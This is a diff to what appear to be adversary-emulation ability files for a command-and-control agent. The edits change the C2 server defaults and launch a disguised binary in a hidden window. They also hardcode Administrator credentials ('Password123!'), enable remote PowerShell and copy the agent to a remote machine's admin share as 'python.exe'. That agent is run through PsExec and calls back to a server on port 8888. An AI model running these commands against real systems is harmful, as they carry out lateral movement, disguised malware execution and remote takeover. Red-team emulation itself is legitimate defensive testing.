@@ -45,14 +45,14 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 10.0.17.3
+      default: 192.168.1.45
 
   executors:
   - name: powershell
     command: |
       Sleep 3;
       $bin = Get-ChildItem *cod*scr*;
-      $arguments = '-server "#{server}" -group "rtlo_group"';
+      $arguments = '-server 192.168.1.45 -group "rtlo_group"';
       start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;
 
       if ($?) {
@@ -165,7 +165,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 192.168.1.45
 
   executors:
   - name: powershell
@@ -1022,7 +1022,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 192.0.2.10
+      default: 192.168.1.45
 
   executors:
   - name: powershell
@@ -1089,12 +1089,13 @@
     windows:
       psh:
         command: |
-          Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential (Get-Credential) -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
+          Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts -Value "DESKTOP-22K14OG" -Force; $username = "Administrator"; $password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential($username, $password); Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential $cred -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
+          
   executors:
   - name: powershell
     command: |
-      Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential (Get-Credential) -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
-
+      Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts -Value "DESKTOP-22K14OG" -Force; $username = "Administrator"; $password = "Password123!" | ConvertTo-SecureString -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential($username, $password); Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential $cred -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
+     
 - id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
   name: Copy Sandcat File
   description: Copy Sandcat file using PsExec
@@ -1109,9 +1110,7 @@
     windows:
       psh,pwsh:
         command: |
-          move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force
-          set-location "C:\Program Files\SysinternalsSuite\";
-          .\PsExec64.exe -accepteula \\DESKTOP-22K14OG -i 0 -d -f -c "C:\Windows\Temp\python.exe" -group -server "http://192.168.1.45:8888";  tasklist /S DESKTOP-22K14OG /FI "IMAGENAME eq python.exe”
+          move-item "C:\Users\Public\sandcat.exe" "\\DESKTOP-22K14OG\C$\Windows\Temp\python.exe" -Force; Set-Location -Path "C:\Program Files\SysInternalsSuite"; .\PsExec64.exe \\DESKTOP-22K14OG -u Administrator -p Password123! -accepteula -i 0 -d "C:\Windows\Temp\python.exe" -group -server "http://192.168.1.45:8888"; tasklist /S DESKTOP-22K14OG /U Administrator /P Password123! /FI "IMAGENAME eq python.exe";
         payloads:
         - sandcat.go-windows-upx
 
